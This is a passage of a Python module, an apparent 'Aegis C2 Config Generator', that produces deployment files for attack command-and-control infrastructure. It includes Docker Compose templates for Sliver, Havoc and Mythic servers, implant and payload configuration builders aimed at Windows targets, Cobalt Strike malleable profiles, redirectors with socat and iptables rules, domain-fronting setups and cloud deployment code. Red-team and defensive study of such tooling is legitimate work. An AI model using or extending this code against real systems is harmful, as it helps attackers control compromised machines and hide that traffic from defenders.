# Generated by Aegis C2 Config Generator

version: '3.8'

services:
  sliver:
    image: ghcr.io/bishopfox/sliver:latest
    container_name: sliver-server
    ports:
      - "31337:31337"  # Multiplayer
      - "8888:8888"    # mTLS
      - "443:443"      # HTTPS
      - "80:80"        # HTTP
      - "53:53/udp"    # DNS
    volumes:
      - ./sliver-data:/root/.sliver
    restart: unless-stopped
    command: daemon

  nginx:
    image: nginx:alpine
    container_name: redirector
    ports:
      - "8443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./ssl:/etc/nginx/ssl:ro
    depends_on:
      - sliver
    restart: unless-stopped

networks:
  default:
    driver: bridge
'''

        elif framework == "havoc":
            return '''
# Havoc C2 Docker Compose
# Generated by Aegis C2 Config Generator

version: '3.8'

services:
  havoc:
    build:
      context: .
      dockerfile: Dockerfile.havoc
    container_name: havoc-server
    ports:
      - "40056:40056"  # Teamserver
      - "443:443"      # HTTPS Listener
    volumes:
      - ./havoc-data:/opt/havoc/data
      - ./profiles:/opt/havoc/profiles
    restart: unless-stopped

networks:
  default:
    driver: bridge
'''

        elif framework == "mythic":
            return '''
# Mythic C2 Docker Compose
# See: https://github.com/its-a-feature/Mythic
# Generated by Aegis C2 Config Generator

# Mythic has its own installer script:
# git clone https://github.com/its-a-feature/Mythic.git
# cd Mythic
# ./mythic-cli install github https://github.com/MythicAgents/apollo.git
# ./mythic-cli start

# This is a simplified reference:
version: '3.8'

services:
  mythic_server:
    image: ghcr.io/its-a-feature/mythic_server:latest
    ports:
      - "7443:7443"
    volumes:
      - ./mythic-data:/Mythic
    environment:
      - MYTHIC_ADMIN_USER=admin
      - MYTHIC_ADMIN_PASSWORD=CHANGE_ME
    restart: unless-stopped

networks:
  default:
    driver: bridge
'''

        return "# Unsupported framework"


class C2ConfigGenerator:
    """
    Main C2 configuration generator class.

    Generates configurations for various C2 frameworks.
    """

    def __init__(self):
        self.profiles = MALLEABLE_PROFILES.copy()
        self.deployer = InfrastructureDeployer()

    def add_custom_profile(self, profile: MalleableProfile):
        """Add a custom malleable profile."""
        self.profiles[profile.name] = profile

    def generate_sliver_config(
        self,
        name: str,
        server: str,
        target_os: ImplantOS = ImplantOS.WINDOWS,
        target_arch: ImplantArch = ImplantArch.AMD64,
        protocol: C2Protocol = C2Protocol.MTLS,
    ) -> Dict[str, Any]:
        """Generate Sliver implant configuration."""
        config = SliverConfig(
            name=name,
            target_os=target_os,
            target_arch=target_arch,
        )

        if protocol == C2Protocol.MTLS:
            config.mtls_server = server
        elif protocol in [C2Protocol.HTTP, C2Protocol.HTTPS]:
            config.http_server = server
        elif protocol == C2Protocol.DNS:
            config.dns_server = server

        return {
            "framework": "sliver",
            "generate_command": config.generate_implant_command(),
            "http_config": config.generate_http_c2_config(),
            "profile_yaml": config.generate_profile_yaml(),
        }

    def generate_havoc_config(
        self,
        server: str,
        listener_name: str = "default",
        profile_name: str = "jquery",
    ) -> Dict[str, Any]:
        """Generate Havoc C2 configuration."""
        malleable = self.profiles.get(profile_name, self.profiles["jquery"])

        config = HavocConfig(
            team_server_host=server,
            listener_name=listener_name,
            user_agent=malleable.user_agent,
            headers=malleable.headers,
            uris=malleable.http_get_uri,
            agent_sleep=malleable.sleep_time,
            agent_jitter=malleable.jitter,
        )

        return {
            "framework": "havoc",
            "profile": config.generate_profile(),
            "agent_command": config.generate_agent_command(),
        }

    def generate_mythic_config(
        self,
        server: str,
        agent_type: str = "apollo",
        target_os: ImplantOS = ImplantOS.WINDOWS,
    ) -> Dict[str, Any]:
        """Generate Mythic C2 configuration."""
        config = MythicConfig(
            server_host=server,
            agent_type=agent_type,
            agent_os=target_os,
        )

        return {
            "framework": "mythic",
            "payload_config": config.generate_payload_config(),
            "graphql_mutation": config.generate_graphql_mutation(),
        }

    def generate_cobalt_strike_profile(
        self,
        profile_name: str = "jquery"
    ) -> str:
        """Generate Cobalt Strike malleable C2 profile."""
        profile = self.profiles.get(profile_name)
        if not profile:
            profile = self.profiles["jquery"]

        return profile.to_cobalt_strike_profile()

    def generate_redirector(
        self,
        hostname: str,
        backend_server: str,
        backend_port: int = 8443,
        webserver: str = "nginx",  # nginx, apache, caddy
    ) -> Dict[str, str]:
        """Generate redirector configuration."""
        redirector = Redirector(
            id=str(uuid.uuid4())[:8],
            hostname=hostname,
            ip="",
            protocol=C2Protocol.HTTPS,
            port=443,
            backend_server=backend_server,
            backend_port=backend_port,
        )

        configs = {
            "id": redirector.id,
            "hostname": hostname,
        }

        if webserver == "nginx":
            configs["config"] = redirector.generate_nginx_config()
        elif webserver == "apache":
            configs["config"] = redirector.generate_apache_config()
        elif webserver == "caddy":
            configs["config"] = redirector.generate_caddy_config()

        configs["socat_command"] = redirector.generate_socat_command()
        configs["iptables_rules"] = redirector.generate_iptables_rules()

        return configs

    def generate_domain_fronting(
        self,
        cdn_provider: str,
        front_domain: str,
        actual_domain: str,
    ) -> Dict[str, Any]:
        """Generate domain fronting configuration."""
        config = DomainFrontingConfig(
            cdn_provider=cdn_provider,
            front_domain=front_domain,
            actual_domain=actual_domain,
            host_header=actual_domain,
        )

        return {
            "configuration": config.get_c2_config(),
            "test_commands": config.generate_test_commands(),
        }

    def generate_infrastructure(
        self,
        provider: str = "aws",
        c2_framework: C2Framework = C2Framework.SLIVER,
    ) -> Dict[str, str]:
        """Generate complete infrastructure configuration."""
        self.deployer.c2_framework = c2_framework

        configs = {
            "framework": c2_framework.value,
            "provider": provider,
        }

        if provider == "aws":
            configs["terraform"] = self.deployer.generate_terraform_aws()
        elif provider == "azure":
            configs["terraform"] = self.deployer.generate_terraform_azure()

        configs["ansible"] = self.deployer.generate_ansible_playbook()
        configs["docker_compose"] = self.deployer.generate_docker_compose()

        return configs

    def get_available_profiles(self) -> List[Dict[str, str]]:
        """Get list of available malleable profiles."""
        return [
            {"name": name, "description": profile.description}
            for name, profile in self.profiles.items()
        ]


# Convenience functions

def generate_sliver_implant(
    name: str,
    server: str,
    os: str = "windows",
    arch: str = "amd64",
    protocol: str = "mtls"
) -> Dict:
    """Quick Sliver implant configuration generator."""
    gen = C2ConfigGenerator()
    return gen.generate_sliver_config(
        name=name,
        server=server,
        target_os=ImplantOS(os),
        target_arch=ImplantArch(arch),
        protocol=C2Protocol(protocol),
    )


def generate_havoc_profile(server: str, profile: str = "jquery") -> Dict:
    """Quick Havoc profile generator."""
    gen = C2ConfigGenerator()
    return gen.generate_havoc_config(server, profile_name=profile)


def generate_mythic_payload(server: str, agent: str = "apollo") -> Dict:
    """Quick Mythic payload configuration generator."""
    gen = C2ConfigGenerator()
    return gen.generate_mythic_config(server, agent_type=agent)


def generate_redirector_config(
    hostname: str,
    backend: str,
    port: int = 8443,
    webserver: str = "nginx"
) -> Dict:
    """Quick redirector configuration generator."""
    gen = C2ConfigGenerator()
    return gen.generate_redirector(hostname, backend, port, webserver)


def generate_cobalt_strike_profile(profile: str = "jquery") -> str:
    """Quick Cobalt Strike profile generator."""
    gen = C2ConfigGenerator()
    return gen.generate_cobalt_strike_profile(profile)


def generate_infrastructure(
    provider: str = "aws",
    framework: str = "sliver"
) -> Dict:
    """Quick infrastructure configuration generator."""
    gen = C2ConfigGenerator()
    return gen.generate_infrastructure(provider, C2Framework(framework))
